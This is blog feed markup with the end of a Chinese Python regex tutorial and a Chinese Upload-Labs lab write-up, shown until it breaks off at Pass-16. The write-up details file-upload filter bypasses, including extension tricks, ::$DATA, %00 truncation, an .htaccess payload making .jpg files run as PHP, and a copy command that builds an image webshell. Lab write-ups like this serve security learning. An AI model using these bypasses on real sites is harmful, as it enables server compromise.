title="表示数量"></a>表示数量</h3><table><thead><tr><th>字符</th><th>功能</th></tr></thead><tbody><tr><td>*</td><td>匹配前一个字符出现0次或者无限次，即可有可无</td></tr><tr><td>+</td><td>匹配前一个字符出现1次或者无限次，即至少有1次</td></tr><tr><td>?</td><td>匹配前一个字符出现1次或者0次，即要么有1次，要么没有</td></tr><tr><td>{m}</td><td>匹配前一个字符出现m次</td></tr><tr><td>{m,}</td><td>匹配前一个字符至少出现m次</td></tr><tr><td>{m,n}</td><td>匹配前一个字符出现从m到n次</td></tr></tbody></table><h3 id="表示边界"><a href="#表示边界" class="headerlink" title="表示边界"></a>表示边界</h3><table><thead><tr><th>字符</th><th>功能</th></tr></thead><tbody><tr><td>^</td><td>匹配字符串开头</td></tr><tr><td>$</td><td>匹配字符串结尾</td></tr><tr><td>\b</td><td>匹配一个单词的边界</td></tr><tr><td>\B</td><td>匹配非单词边界</td></tr></tbody></table><h3 id="匹配分组"><a href="#匹配分组" class="headerlink" title="匹配分组"></a>匹配分组</h3><table><thead><tr><th>字符</th><th>功能</th></tr></thead><tbody><tr><td>\</td><td>\</td><td></td><td>匹配左右任意一个表达式</td></tr><tr><td>(ab)</td><td>将括号中字符作为一个分组</td></tr><tr><td><code>\num</code></td><td>引用分组num匹配到的字符串</td></tr><tr><td><code>(?P&lt;name&gt;)</code></td><td>分组起别名</td></tr><tr><td>(?P=name)</td><td>引用别名为name分组匹配到的字符串</td></tr></tbody></table><h3 id="更精准匹配"><a href="#更精准匹配" class="headerlink" title="更精准匹配"></a>更精准匹配</h3><p>要做更精确地匹配，可以用<code>[]</code>表示范围</p><p>比如匹配手机号 在大陆手机号的第一位都是1</p><p>而第二位貌似只能是 3,4,5,7,8</p><p>那么要做到更精准我们可以这样写</p><p><a href="https://imgchr.com/i/EdSC4I" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/04/EdSC4I.md.png" alt="EdSC4I.md.png"></a></p><p>上面有/d /D 大写表示取反的作用那<code>[]</code>也是可以取反的</p><p><a href="https://imgchr.com/i/EdSebQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/04/EdSebQ.md.png" alt="EdSebQ.md.png"></a></p><p>前面加一个^就表示对括号里面的取反</p><h3 id="小练习-匹配手机号的正则表达式"><a href="#小练习-匹配手机号的正则表达式" class="headerlink" title="小练习:匹配手机号的正则表达式"></a>小练习:匹配手机号的正则表达式</h3><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="keyword">import</span> re</span><br><span class="line">&gt;&gt;&gt; re.<span class="keyword">match</span>(<span class="string">"^1[35678]\d&#123;9&#125;$"</span>,<span class="string">"18711111111"</span>)</span><br><span class="line">&lt;re.<span class="type">Match</span> <span class="class"><span class="keyword">object</span></span>; span=(<span class="number">0</span>, <span class="number">11</span>), <span class="keyword">match</span>=<span class="symbol">'1871111111</span>1'&gt;</span><br></pre></td></tr></table></figure><h2 id="原始字符串"><a href="#原始字符串" class="headerlink" title="原始字符串"></a>原始字符串</h2><p>这块我最开始也是比较懵的 可能有点难理解</p><p><code>Python中字符串前面加上 r 表示原生字符串</code>，</p><p>与大多数编程语言相同，<code>正则表达式里使用&quot;\&quot;作为转义字符</code>，这就可能造成反斜杠困扰。假如你需要匹配文本中的字符”\“，那么使用编程语言表示的正则表达式里将需要4个反斜杠”\“：前两个和后两个分别用于在编程语言里转义成反斜杠，转换成两个反斜杠后再在正则表达式里转义成一个反斜杠。</p><p>像用<code>&#39;\\\\&#39;</code>来匹配<code>\</code>的处理办法看上去太丑陋了。为了简化理解和操作，Python提供了原始字符串</p><p><a href="https://imgchr.com/i/EdYm11" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/04/EdYm11.md.png" alt="EdYm11.md.png"></a></p><p><code>&#39;\\\\&#39;</code>在正则匹配函数中先被理解为<code>&#39;\\&#39;</code>，而<code>&#39;\\&#39;</code>用来匹配待处理字符串，则再一次被理解为用<code>\</code>来匹配字符串。</p><h2 id="实际案例"><a href="#实际案例" class="headerlink" title="实际案例"></a>实际案例</h2><h3 id="匹配出0-100之间的数字"><a href="#匹配出0-100之间的数字" class="headerlink" title="匹配出0-100之间的数字"></a>匹配出0-100之间的数字</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.match(<span class="string">r"[1-9]?\d?$|100$"</span>,<span class="string">"0"</span>)</span><br><span class="line">&lt;re.Match object; span=(<span class="number">0</span>, <span class="number">1</span>), match=<span class="string">'0'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.match(<span class="string">r"[1-9]?\d?$|100$"</span>,<span class="string">"100"</span>)</span><br><span class="line">&lt;re.Match object; span=(<span class="number">0</span>, <span class="number">3</span>), match=<span class="string">'100'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.match(<span class="string">r"[1-9]?\d?$|100$"</span>,<span class="string">"52"</span>)</span><br><span class="line">&lt;re.Match object; span=(<span class="number">0</span>, <span class="number">2</span>), match=<span class="string">'52'</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="分组提取"><a href="#分组提取" class="headerlink" title="分组提取"></a>分组提取</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = re.match(<span class="string">r"&lt;h1&gt;(.*)&lt;/h1&gt;"</span>,<span class="string">"&lt;h1&gt;匹配分组&lt;/h1&gt;"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result.group()</span><br><span class="line"><span class="string">'&lt;h1&gt;匹配分组&lt;/h1&gt;'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result.group(<span class="number">1</span>)</span><br><span class="line"><span class="string">'匹配分组'</span></span><br></pre></td></tr></table></figure><p>正则表达式中出现了一个括号 所以group(1)会提取出第一个括号里的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = re.match(<span class="string">r"(&lt;h1&gt;)(.*)(&lt;/h1&gt;)"</span>,<span class="string">"&lt;h1&gt;匹配分组&lt;/h1&gt;"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result.group(<span class="number">1</span>)</span><br><span class="line"><span class="string">'&lt;h1&gt;'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result.group(<span class="number">3</span>)</span><br><span class="line"><span class="string">'&lt;/h1&gt;'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result.group(<span class="number">0</span>)</span><br><span class="line"><span class="string">'&lt;h1&gt;匹配分组&lt;/h1&gt;'</span></span><br></pre></td></tr></table></figure><p>group(0) 会提取出整个内容</p><h3 id="分组进阶提取"><a href="#分组进阶提取" class="headerlink" title="分组进阶提取"></a>分组进阶提取</h3><p>我们都知道html标签都是会成对出现的</p><p>那么我们应该写一个可以成对匹配的正则表达式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">"&lt;html&gt;&lt;h1&gt;itcast&lt;/h1&gt;&lt;/html&gt;"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.match(<span class="string">r"&lt;(.+)&gt;&lt;(.+)&gt;.+&lt;/\2&gt;&lt;/\1&gt;"</span>,s)// \<span class="number">1</span>表示第一个分组 \<span class="number">2</span>表示第二个分组</span><br><span class="line">&lt;re.Match object; span=(<span class="number">0</span>, <span class="number">28</span>), match=<span class="string">'&lt;html&gt;&lt;h1&gt;itcast&lt;/h1&gt;&lt;/html&gt;'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">"&lt;html&gt;&lt;h1&gt;itcast&lt;/h2&gt;&lt;/script&gt;"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.match(<span class="string">r"&lt;(.+)&gt;&lt;(.+)&gt;.+&lt;/\2&gt;&lt;/\1&gt;"</span>,s)</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/Ed6con" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/04/Ed6con.md.png" alt="Ed6con.md.png"></a></p><p>橙色框的案例 前后标签不同所以无法匹配</p><p>看起来这样做确实很不错 不过我如果有一万个分组那该怎么办</p><p>挨个数然后&lt;/\10000&gt;么 显然不可能</p><p>还有一种方法 前面匹配的表里有些写过</p><p>给分组命名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ret = re.match(<span class="string">r"&lt;(?P&lt;name1&gt;\w*)&gt;&lt;(?P&lt;name2&gt;\w*)&gt;.*&lt;/(?P=name2)&gt;&lt;/(?P=name1)&gt;"</span>, <span class="string">"&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h1&gt;&lt;/html&gt;"</span>)</span><br><span class="line">ret.group()</span><br></pre></td></tr></table></figure><h2 id="re模块高级用法"><a href="#re模块高级用法" class="headerlink" title="re模块高级用法"></a>re模块高级用法</h2><h3 id="re-search"><a href="#re-search" class="headerlink" title="re.search"></a>re.search</h3><p>search方法与match方法极其类似，区别在于match()函数只检测re是不是在string的开始位置匹配，search()会扫描整个string查找匹配，match（）只有在0位置匹配成功的话才有返回，如果不是开始位置匹配成功的话，match()就返回None。同样，search方法的返回对象同样match()返回对象的方法和属性</p><p><img src="https://s2.ax1x.com/2019/05/04/Edf8L8.png" alt="Edf8L8.png"></p><p>这种情况下match就无法匹配</p><h3 id="re-findall"><a href="#re-findall" class="headerlink" title="re.findall"></a>re.findall</h3><p>以列表形式返回全部能匹配的子串</p><p>符合匹配以后会继续往下寻找匹配的字符串</p><p><img src="https://s2.ax1x.com/2019/05/04/EdfWWR.png" alt="EdfWWR.png"></p><h3 id="re-sub"><a href="#re-sub" class="headerlink" title="re.sub"></a>re.sub</h3><p>将匹配到的数据进行替换</p><p><img src="https://s2.ax1x.com/2019/05/04/Edf5y6.png" alt="Edf5y6.png"></p><p>将标签替换为空 意思是只匹配文字</p><p>执行后效果为</p><p><img src="https://s2.ax1x.com/2019/05/04/Edfvlt.png" alt="Edfvlt.png"></p><h3 id="re-split"><a href="#re-split" class="headerlink" title="re.split"></a>re.split</h3><p>根据匹配进行切割字符串，并返回一个列表</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#split 匹配切割字符串</span></span><br><span class="line">&gt;&gt;&gt;c = <span class="string">"ctf:php,python,web-misc"</span></span><br><span class="line">&gt;&gt;&gt;d = re.split(<span class="string">r":|,|-"</span>,c)<span class="regexp">//</span>用(: , -)为依据 分割字符串</span><br><span class="line">&gt;&gt;&gt;print(d)</span><br><span class="line">[<span class="string">'ctf'</span>, <span class="string">'php'</span>, <span class="string">'python'</span>, <span class="string">'web'</span>, <span class="string">'misc'</span>]</span><br></pre></td></tr></table></figure><h2 id="贪婪和非贪婪"><a href="#贪婪和非贪婪" class="headerlink" title="贪婪和非贪婪"></a>贪婪和非贪婪</h2><p>Python里数量词默认是贪婪的（在少数语言里也可能是默认非贪婪），总是尝试匹配尽可能多的字符；</p><p>非贪婪则相反，总是尝试匹配尽可能少的字符。</p><p>在”*”,”?”,”+”,”{m,n}”后面加上？，使贪婪变成非贪婪。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; s=<span class="string">"This is a number 234-235-22-423"</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; r=re.match(<span class="string">".+(\d+-\d+-\d+-\d+)"</span>,s)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; r.group(<span class="number">1</span>)</span><br><span class="line"><span class="string">'4-235-22-423'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; r=re.match(<span class="string">".+?(\d+-\d+-\d+-\d+)"</span>,s)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; r.group(<span class="number">1</span>)</span><br><span class="line"><span class="string">'234-235-22-423'</span></span><br></pre></td></tr></table></figure><p>正则表达式模式中使用到通配字，那它在从左到右的顺序求值时，会尽量“抓取”满足匹配最长字符串，在我们上面的例子里面，<u>“.+”会从字符串的启始处抓取满足模式的最长字符，其中包括我们想得到的第一个整型字段的中的大部分，“\d+”只需一位字符就可以匹配，所以它匹配了数字“4”</u>，而“.+”则匹配了从字符串起始到这个第一位数字4之前的所有字符。</p><p><strong>解决方式：非贪婪操作符“？”，这个操作符可以用在”*”,”+”,”?”的后面，要求正则匹配的越少越好。</strong></p><h3 id="小练习"><a href="#小练习" class="headerlink" title="小练习"></a>小练习</h3><h4 id="1提取图片链接"><a href="#1提取图片链接" class="headerlink" title="1提取图片链接"></a>1提取图片链接</h4><p><a href="https://imgchr.com/i/Ed5aJH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/04/Ed5aJH.png" alt="Ed5aJH.png"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">e = </span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;img dataoriginal="https://rpic.douyucdn.cn/appCovers/2016/11/13/1213973_201611131917_small.jpg" src="https://rpic.ucdn.cn/appCovers/2016/11/13/1213973_201611131917_small.jpg" style="display: inline;"&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">f = re.search(<span class="string">"http.+?\.jpg"</span>,e)</span><br><span class="line"></span><br><span class="line">print(f.group())</span><br></pre></td></tr></table></figure><p>结果为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>rpic.douyucdn.cn<span class="regexp">/appCovers/</span><span class="number">2016</span><span class="regexp">/11/</span><span class="number">13</span><span class="regexp">/1213973_201611131917_small.jpg</span></span><br></pre></td></tr></table></figure><h4 id="2提取网址"><a href="#2提取网址" class="headerlink" title="2提取网址"></a>2提取网址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.interoem.com/messageinfo.asp?id=35</span><br></pre></td></tr></table></figure><p>正则提取后为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.interoem.com/</span><br></pre></td></tr></table></figure><p>代码为</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">g = <span class="string">"http://www.interoem.com/messageinfo.asp?id=35"</span></span><br><span class="line">h = re.sub(<span class="string">"(http://.+?/).*"</span>,lambda x:x.group(1),g)</span><br><span class="line">print(h)</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正则表达式 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Upload-Labs wp</title>
      <link href="/2019/04/28/up/"/>
      <url>/2019/04/28/up/</url>
      <content type="html"><![CDATA[<p><img src="https://i.loli.net/2019/04/24/5cbfe060c7285.png" alt="mind-map.png"></p><p>一个上传漏洞总结的很全的靶场</p><a id="more"></a><p>因为最近效率比较低(难听点就是懒) 所以国光哥说</p><p>可以一天搞完这些东西然后写篇博客 逼自己一下</p><p>本来是应该一天搞完的结果学校停电了没网</p><p><img src="https://i.loli.net/2019/04/26/5cc2c2fe0869d.jpg" alt="QQ图片20190426163558.jpg"></p><p>真的不是在找借口哈</p><p>不过也真的学到了很多新姿势呀。</p><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>猜测第一关应该比较简单前端验证</p><p>创建后缀为jpg的文件</p><p><img src="https://i.loli.net/2019/04/24/5cbfdddbafa91.jpg" alt="Xnip2019-04-24_11-53-42.jpg"></p><p>上传 抓包改后缀即可绕过</p><p><img src="https://i.loli.net/2019/04/24/5cbfde79e959d.jpg" alt="Xnip2019-04-24_11-56-29.jpg"></p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>第二题 也是比较常见的</p><p>猜测是验证content-type</p><p>于是修改content-type为jpg的类型 即可绕过。</p><p><img src="https://i.loli.net/2019/04/24/5cbfdf34610f6.jpg" alt="Xnip2019-04-24_11-59-28.jpg"></p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p><img src="https://i.loli.net/2019/04/26/5cc27fa4c9363.png" alt="QQ截图20190426114844.png"></p><p>上传一个php文件发现 黑名单上传 立即想到的就是大小写混合绕过</p><p>试了一下不可以 查看源码发现都被转换成了小写GG了</p><p>把后缀改为php3上传成功解析</p><p><img src="https://i.loli.net/2019/04/26/5cc282e0cb7c8.png" alt="QQ截图20190426120230.png"></p><p>貌似是apache里面的设置 会把php3当作php去解析</p><p>第一次在mac下搭建环境却一直不能成功 </p><p>还有另一种姿势 上传<code>.htaccess</code>。</p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>这就用到了前面说的.htaccess了</p><p>因为还是黑名单验证 我们可以上传一个<code>.htaccess</code>上去</p><p>内容为</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch ".jpg"&gt;</span></span><br><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure><p>把.jpg的文件当作php去解析</p><p><img src="https://i.loli.net/2019/04/26/5cc282bb2022e.png" alt="QQ截图20190426120144.png"></p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>还是黑名单验证 不过呢这里也过滤<code>.htaccess</code>了</p><p>但是反过来观察一下 这里却没有进行大小写的转换 PhP直接上传</p><p>美滋滋</p><p><img src="https://i.loli.net/2019/04/26/5cc2864239c6e.png" alt="QQ截图20190426121657.png"></p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>还是黑名单验证</p><p>回头看看思维导图</p><p>黑名单验证里的空格绕过 这时候源码里并没有过滤空格  所以在.php后添加空格即可绕过</p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>黑名单验证</p><p>这题最开始有点蒙 看了源码也没想到。。太菜了</p><p>偷偷看了网上的wp</p><p>忽略了本题没有对后缀进行去.的处理</p><p>利用windows的特性会自动去掉后面的.</p><p>上传<code>07.php.</code>即可绕过</p><p><img src="https://i.loli.net/2019/04/26/5cc28d48461a9.png" alt="QQ截图20190426124530.png"></p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>黑名单验证</p><p>这次发现了重点 没有去除字符串<code>::$DATA</code></p><p>这种方法实战没用到过 ctf也没用到过 </p><p>仔细查了一下涨姿势了</p><p>必须是windows, 必须是php<br>php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名<br>他的目的就是不检查后缀名….</p><p>上传xx.php::$DATA发现无法找到此文件</p><p>windows会去掉::$DATA 直接访问xx.php即可</p><p><img src="https://i.loli.net/2019/04/26/5cc2901e8fb0f.png" alt="QQ截图20190426125751.png"></p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p>到这里又没了思路。。</p><p>思维导图是个好东西。</p><p>最常用的陌生后缀解析漏洞都给忘了</p><p>我上传一个09.php.xxx</p><p>apache的特性从右往左依次解析 不认识的后缀会一直往左解析 </p><p>无法解析xxx就解析成了php。上传成功</p><p><img src="https://i.loli.net/2019/04/26/5cc292da2a70a.png" alt="QQ截图20190426130942.png"></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>到了10题以后源码上就没了注释了</p><p>这里我自己写一下注释也为了巩固一下php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);<span class="comment">//黑名单</span></span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        <span class="comment">//移除字符串两侧的空白字符。也就是这里为什么不能空格绕黑名单的原因喽</span></span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);<span class="comment">//将问题后缀名替换为空</span></span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读懂了源码</p><p>发现这才是重点</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">""</span>, <span class="variable">$file_name</span>);<span class="regexp">//</span>将问题后缀名替换为空</span><br></pre></td></tr></table></figure><p>替换为空所以我们双写绕过</p><p><img src="https://i.loli.net/2019/04/26/5cc2a0e99cf21.png" alt="QQ截图20190426140902.png"></p><p><img src="https://i.loli.net/2019/04/26/5cc2a0f1303c0.png" alt="QQ截图20190426140955.png"></p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>白名单验证</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file<span class="emphasis">_ext = substr($_</span>FILES[<span class="string">'upload_file'</span>][<span class="symbol">'name'</span>],strrpos($<span class="emphasis">_FILES['upload_</span>file'</span><br><span class="line">['name'],".")+1);</span><br></pre></td></tr></table></figure><p>先介绍一下函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(string,<span class="keyword">start</span>,<span class="keyword">length</span>)//返回<span class="keyword">string</span>从<span class="keyword">start</span>开始的<span class="keyword">length</span>长度</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">strrpos</span><span class="params">($_FILES[<span class="string">'upload_file'</span>[<span class="string">'name'</span>],<span class="string">"."</span>)</span></span><span class="comment">//查找.在文件里最后一次出现的位置</span></span><br></pre></td></tr></table></figure><p>回过头来看题 查找文件名中最后一个点后面的后缀 也就是说这行代码就防止了我们 <strong>双后缀名绕过</strong></p><p>那么该怎么做呢</p><p>博客前面写过类似的方法</p><p>在路径上11.php后面进行截断后端则会认为11.php 是文件名 真实文件名被截断了所以改成11.jpg进行绕过即可</p><p>get会对%00进行自解码所以不用解码</p><p><img src="https://i.loli.net/2019/04/26/5cc2a8826d6ed.png" alt="QQ截图20190426144229.png"></p><p><strong>截断条件：</strong><br><strong>php版本小于5.3.4 详情关注CVE-2006-7243</strong><br><strong>php的magic_quotes_gpc为OFF状态</strong></p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>与上面题目类似</p><p>只不过这题save_path是通过post传输的</p><p><img src="https://i.loli.net/2019/04/26/5cc2b7660bfaa.png" alt="QQ截图20190426154635.png"></p><p>post不会像get对%00进行自动解码 所以%00解码</p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p><img src="https://i.loli.net/2019/04/26/5cc2b7c843013.png" alt="QQ截图20190426154813.png"></p><p>13题与前面都不同 上传图片马 然后利用文件包含漏洞 包含phpinfo</p><p>dos下命令制作图片马</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">copy <span class="number">1.</span>jpg /b + <span class="number">1.</span>php /a <span class="number">13.</span>jpg</span><br><span class="line">参数/b指定以二进制格式复制、合并文件; 用于图像类/声音类文件</span><br><span class="line">参数/a指定以ASCII格式复制、合并文件。用于txt等文档类文件</span><br><span class="line">copy <span class="number">1.</span>jpg /b + <span class="number">1.</span>php /a <span class="number">13.</span>jpg </span><br><span class="line"><span class="comment">//意思是将1.jpg以二进制与1.php合并成13.jpg</span></span><br><span class="line">那么<span class="number">2.</span>jpg就是图片木马了。</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/26/5cc2baf061944.png" alt="QQ截图20190426155736.png"></p><p>生成出来这时候利用文件包含漏洞 包含该文件即可</p><p><img src="https://i.loli.net/2019/04/26/5cc2bad3e2be3.png" alt="QQ截图20190426160102.png"></p><p>jpg gif是一个道理的。</p><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p>与<code>Pass-13</code>是一样的突破方法</p><p>唯一不同的是getimagesize获取文件类型</p><p>我们直接上传的本来就是图片类型。所以姿势是一样的。</p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>多了个php_exif模块来判断文件类型</p><p>突破方法与<code>Pass-13</code>一致</p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p><del>突破方法与<code>Pass-13</code>一致</del></p><p><img src="https://i.loli.net/2019/04/26/5cc2c2fe0869d.jpg" alt="QQ图片20190426163558.jpg"></p><p>本来以为还是和前面方法一致但是文件包含的时候却不行</p><p>查看源代码发现考察的是二次渲染 姿势盲区了 故查了下资料(百度太垃圾什么也没有用google哦)</p><p>普通的图片马上传以后</p><p>经过<code>imagecreatefromjpeg</code></p><p>函数二次渲染，图片尾部的php一句话被删除</p><p>看了一篇类似的文章 